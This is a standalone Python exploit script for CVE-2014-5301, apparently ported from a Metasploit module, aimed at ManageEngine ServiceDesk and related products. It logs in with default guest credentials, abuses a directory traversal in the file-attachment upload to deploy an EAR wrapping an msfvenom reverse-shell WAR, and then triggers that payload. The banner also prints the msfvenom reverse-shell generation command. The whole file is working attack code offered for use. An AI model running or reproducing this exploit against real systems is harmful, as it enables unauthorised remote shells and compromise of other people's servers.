#!/bin/python3

import sys
import requests
import zipfile
from requests_toolbelt import MultipartEncoder
import string
import random
import time

def make_ear(war_payload, war_app_base, ear_app_base, display_name, ear_file_name):
    # Read in the war file created by msfvenom
    ear = zipfile.ZipFile(ear_file_name + '.ear', "w")
    #add war file to ear
    ear.writestr(war_app_base + '.war', war_payload)

    # ... and then we create an EAR file that will contain it.
    app_xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
    app_xml += "<application>"
    app_xml += "<display-name>{}</display-name>".format(display_name)
    app_xml += "<module><web><web-uri>{}</web-uri>".format(war_app_base + '.war')
    app_xml += "<context-root>/{}</context-root></web></module></application>".format(ear_app_base)
	
    ear.writestr('META-INF/application.xml', app_xml)

    ear.close()
	
def banner():

    print("""# ManageEngine Multiple Products Authenticated File Upload
#
# [CVE', '2014-5301'],
# ['OSVDB', '116733'],
# ['URL', 'http://seclists.org/fulldisclosure/2015/Jan/5']
#
# NOTE 1: This script is a standalone python based on the metasploit module POC script exercise.
# NOTE 2: Not all versions supported by the original metasploit module have been ported. See 'Tested on'.
#
# Description from original exploit:
#        This module exploits a directory traversal vulnerability in ManageEngine ServiceDesk,
#        AssetExplorer, SupportCenter and IT360 when uploading attachment files. The JSP that accepts
#        the upload does not handle correctly '../' sequences, which can be abused to write
#        to the file system. Authentication is needed to exploit this vulnerability, but this module
#        will attempt to login using the default credentials for the administrator and guest
#        accounts. Alternatively, you can provide a pre-authenticated cookie or a username / password.
#        For IT360 targets, enter the RPORT of the ServiceDesk instance (usually 8400). All
#        versions of ServiceDesk prior v9 build 9031 (including MSP but excluding v4), AssetExplorer,
#        SupportCenter and IT360 (including MSP) are vulnerable. At the time of release of this
#        module, only ServiceDesk v9 has been fixed in build 9031 and above. This module has been
#        been tested successfully in Windows and Linux on several versions.
#
# Ported by: Andrea Bruschi
# Tested on: MS Windows 2008 Server and ManageEngine Service Desk Plus 7.6.0

# payload gen: msfvenom -p java/shell_reverse_tcp LHOST=<ip address> LPORT=4444 -f war > shelljsp.war

""")

    print("Usage: script.py file.war host port")
    print("35845.py shell.war 10.11.1.145 8080")


def get_cookie(target_uri):

    print("Requesting {}".format(target_uri))
    headers = { 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': None, 'Accept-Encoding': None, 'Accept': None }
    res = requests.get(target_uri, headers=headers)
    return res.cookies['JSESSIONID']


def login(target_uri, cookie):
    
    print("Attempting login with default credentials: guest/guest");

    target_uri += "j_security_check;jsessionid=" + str(cookie)
    headers = { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Connection': None, 'Accept-Encoding': None, 'Accept': None }
    
    data = {'j_username': 'guest', 'j_password': 'guest', 'logonDomainName': ''}

    res = requests.post(target_uri, headers=headers, data=data)
    return cookie, res.url, res.text, res.status_code

def upload_request(cookie, target_uri, payload_name, payload_str):

    print("Uploading the payload on the server...");

    b = ''.join(random.choice(string.digits) for _ in range(10))

    target_uri += "common/FileAttachment.jsp"
    headers = { 'Connection': None,  'Accept-Encoding': None, 'Accept': None, 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Cookie': 'JSESSIONID=' + str(cookie) + ';', 'Content-Type': 'multipart/form-data; boundary=_Part_955_395451011_' + b }

    upload_path = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(5))
    rname1 = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(7))

    # must change every try you make or upload will fail!!!!
    att_desc = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(20))


    if '.ear' in payload_name:
        upload_path = '../../server/default/deploy'

    fields = {rname1: (payload_name, payload_str, 'application/octet-stream', {'Content-Transfer-Encoding': 'binary'}), 'att_desc': att_desc, 'module': upload_path}

    m = MultipartEncoder(fields, boundary='_Part_955_395451011_' + b)
    res = requests.post(target_uri, data=m.to_string(), headers=headers)
    return cookie, res.text, res.status_code

def run_payload(target_uri, ear_app_base, war_app_base, rts7):

    print("Attempting to launch payload in deployed WAR...")
    headers = { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Connection': None, 'Accept-Encoding': None, 'Accept': None  }

    target_uri += ear_app_base + "/" + war_app_base + "/" + rts7
    res = requests.get(target_uri, headers=headers)
    return res.status_code


def main():

    if len(sys.argv) == 4:
        war = sys.argv[1]
        host = sys.argv[2]
        port = sys.argv[3]
        
        rts1 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(6)) # war_app_base
        rts2 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16)) # ear_app_base
        rts3 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(14)) # display_name
        rts4 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16)) # ear_file_name
        rts5 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(11)) # multipart 1
        rts6 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(11)) # multipart 2

        war_app_base = rts1
        war = open(sys.argv[1], 'rb')
        war_payload = war.read()
        war.close()

        ear_app_base = rts2
        display_name = rts3
        ear_file_name = rts4
        rts7 = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(9))


        make_ear(war_payload, war_app_base, ear_app_base, display_name, ear_file_name)


        target_uri = "http://" + host + ":" + port + "/"
		

        cookie, url, text, status = login(target_uri, get_cookie(target_uri))

        if status == 200:
            print("[+] Login successfull!")
        else:
            print("[-] Login failed..")
            sys.exit(0)
		


        #bogus upload 
        #payload_name = ear_app_base
        #payload_str = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(9))
        cookie, text, status = upload_request(cookie, target_uri, rts5, rts6)


        #payload uploas
        payload_name = ear_app_base
        ear = open(ear_file_name + '.ear', 'rb')
        ear_file = ear.read()
        ear.close()
        cookie, text, status = upload_request(cookie, target_uri, payload_name + '.ear', ear_file)

        if status == 200:
            print("[+] Payload uploaded successfully!")
        else:
            print("[-] Upload gone wrong :/")
            sys.exit(0)


        for i in range(10):
            if run_payload(target_uri, ear_app_base, war_app_base, rts7) == 200:
                print("[+] Hurray! Incoming reverse shell!")
                sys.exit(0)
                
            else:
                rts7 = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(9))

        print("[-] Reverse shell not coming..")
        print("[+] Try to manually check here: " + target_uri + ear_app_base + "/" + war_app_base + "/" + rts7)

		
    else:
        banner()
		

if __name__ == "__main__":
    main()
